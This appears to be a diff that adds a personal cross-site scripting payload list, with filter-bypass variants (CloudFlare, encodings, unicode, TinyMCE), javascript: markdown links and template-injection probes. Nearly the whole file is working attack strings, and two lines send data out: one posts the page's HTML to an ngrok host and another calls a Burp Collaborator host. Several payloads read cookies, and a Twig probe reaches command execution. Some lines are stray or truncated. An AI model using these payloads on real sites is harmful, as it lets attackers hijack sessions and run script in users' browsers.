@@ -1,1 +1,114 @@
-\&#34;+confirm(1)+&#34; 
+Default ones
+	n///'\"><iframe src=http://localhost></iframe>
+	///'\"><a href=\"&#74;avascript&#x3a;alert()\"\x61\x6c\x65\x72\x74\" //
+	{{this}}{{self}}<b onmouseover=alert()>lopseg<svg onload=(confirm)()1 //
+	
+	'\" onerror=alert()><svg/onload=alert(1)>	 //   
+	javascript%3a%2f*<%2fscript><svg%2fonload%3d'%26%2f"%2f%2b%2fonmouse
+	over%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image).src%3d([]%2b%2f\%2fjodson\.burpcollaborator.net%2f).replace(%2f\\%2fg%2c[]))%2f%2f'>
+	'"><img src=x onerror=alert(document.domain)>
+	'"><<img src=x onerror=alert(document.domain)>
+	'">><<img src=x onerror=alert(document.domain)>'" onerror=alert()>{{9*9}}
+<button formaction=javascript:z=top;x=document;y=x.domain; z[/al/.source+/ert/.source](y)>XSS</button>
+Bitwise operand before equal sign - URL encoded
+
+	<svg%20onload%0a||||=%27z=top%09;%0atop[/pro/.source+/mpt/.source]%28document.domain%29%20%27<li
+
+CloudFlare bypass
+	<SvG OnLy=1 OnLoAd=/*.1|*/lopseg=document;lopseg2=lopseg.domain;(confirm)(lopseg2)>
+unicode normalizzation payload
+
+	\u0022\u226F\u226Eimg src\u003dx onerror\u003dalert()\u226F
+
+triple url encode
+	%252522+onmouseover=alert(1)+x=%252522s
+	
+'"><>--!><--lopseg'"><>--!><-->>>>>>!--><img src=v onerror=alert(2)>{{7*7}}{{constructor.constructor('alert(document.cookie)')()}}javascript:alert(12)
+
+<svg onpointerenter=z=alert,z(document.domain)>
+
+<img src=x onerror=alert(new Image().src='http://564dec66b8b2.ngrok.io/any?output='+document.body.innerHTML>
+
+<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div">
+
+XSS inside tynemce
+	<TABLE><TD><DIV><iframe/<META HTTP-EQUIV='refresh' CONTENT='0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgncmFmYWVsJyk8L3NjcmlwdD4K'>
+
+'\"1</Title></Textarea></Noscript><Svg/OnLoad=\"(confirm)()\">
+
+<object/data=javascript:alert()>
+<a/href="javascript%0A%0D:alert()">
+
+\u0022\u003e\u003cimg src\u003dx onerror\u003dalert()\u003e\u007b\u007b9*9\u007d\u007d\u0020\u0024\u0024\u007b\u007b9*9\u007d\u007d
+
+'\"><a href=\"&#74;avascript&#x3a;self['\\x61\\x6c\\x65\\x72\\x74']('\\x58\\x53\\x53')\">test</a>
+%3Ca+href%3D%22%01java%03script%3Aconfirm%28document.domain%29%22%3EClick+to+execute%3Ca%3E%0D%0A
+
+<a href="&#74;avascript&#x3a;z=top;z[/al/.source+/ert/.source](8)">click this link</a>
+
+&#34;   ====  \"
+
+javascript:z=top;z[/al/.source+/ert/.source](8);httap://test.com/
+
+<script>alert();fdjshafjdhsafjdshbafdhasdf
+gggtgbvhygfhhhhhg 5
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoIlhTUyIpPg==>
+
+'\"><!-->uu <noscript><p title=\"</noscript><a href=\"javascript:alert() //<a href=\"javascript:alert(1)\"><img src=x'/// onauxclick = (confirm)() onerror=alert(1)>\">
+
+Hex encoding xss bypass
+	%26%23x003C;script%26%23x003E;alert(1)%26%23x003C;/script%26%23x003E
+
+Iframe src-doc same origin xss bypass
+	<iframe/src-doc
+'\" onauxclick=alert()><svg/onerror=alert(1)>
+
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=alert(document.location)>
+
+'\" onauxclick=(confirm)() </Title></Textarea/></Noscript><Svg/OnLoad=(confirm)(9)>  //
+
+'\"%3e%0a%3Clopseg+onauxclick%20=%0a'top[/al/.source%2b/ert/.source](8)%3b' %0a%3eLOPSEGHERE
+
+{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}
+
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\u0022a\u0022,\u0022alert(1)\u0022].sort(toString.constructor);}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}
+
+<script>/&/-alert(1)</script>
+<script>/&/-alert(1)</script>
+
+%00%00%00%00%00%00%00<script>alert(1)</script>     (1.Null bytes are output   2.There is no space character immediately before)
+
+<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`">
+
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click 
+
+<script>alert.call(null,1)</script>   (alert.call(%20, "XSS");)
+
+<script>confirm.call(null,1)</script>
+
+<script>prompt.call(null,1)</script>
+
+<script>alert.apply(null, [1])</script>
+
+<b  onmouseup='' html='' onmouseleave='' onmousewheel='' onmouseover='' onmouseenter='' onmousedown='' onmouseout='' onmousemove='alert(document.location)'' onclick='test' ondblclick='test' onmousedown='test' onmousemove='test' onmouseover='test' onmouseout='test' onmouseup='test' onkeydown='test' onkeypress='test' onkeyup='test' on bort='test' onerror='test' onload='' onresize='test' onscroll='test' onunload='test' onsubmit='test' onblur='test' onchange='test' onfocus='test' onreset='test' onselect='test' onMoveOn='test' onauxclick='test' oncontextmenu='test' onmouseleave='test' ontouchcancel='test'></iframe>
+
+[about:blank](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))[about:blank](Javascript:self['\x61\x6c\x65\x72\x74']('\x58\x53\x53'))[about:blank](about:blank)[about:blank](https://talent.hubstaff.com/profiles/rafael-silv/j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))[about:blank](https://talent.hubstaff.com/profiles/rafael-silv/j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))[about:blank](https://talent.hubstaff.com/profiles/rafael-silv/j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))[a](javascript:prompt(document.cookie))[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))![a](javascript:prompt(document.cookie))\&gt;[text](http://danlec.com \" [@danlec](/danlec) \")[a](javascript:this;alert(1))[a](javascript:this;alert(1))[a](javascript:this;alert(1))[a](Javascript:alert(1))[a](Javas%26%2399;ript:alert(1))[a](javascript:alert(1))[a](javascript:confirm(1)[a](javascript://www.google.com%0Aprompt(1))[a](javascript://%0d%0aconfirm(1);com)[a](javascript:window.onerror=confirm;throw%201)[a](javascript:alert(document.domain))[a](javascript://www.google.com%0Aalert(1))[a]('javascript:alert(\"1\")')[a](JaVaScRiPt:alert(1))![a](https://www.google.com/image.png\"onload=\"alert(1))![a](\"onerror=\"alert(1))
+
+
+```mermaid
+graph LR
+    id1["<img src=x onerror=alert#lpar;document.domain#rpar;>"]
+ ```
+
+
+${9*9}
+{{9*9}}
+${{9*9}}
+{9*9}
+<%= 7 * 7 %>
+[[5*5]]
+
+'\"><b>lopseg</b>'\"><img src=x>
+
+["onAbort","onBlur","onChange","onClick","onDblClick","onDragDrop","onError","onFocus","onKeyDown","onKeyPress","onKeyUp","onLoad","onMouseDown","onMouseMove","onMouseOut","onMouseOver","onMouseUp","onMove","onReset","onResize","onSelect","onSubmit","onUnload"]
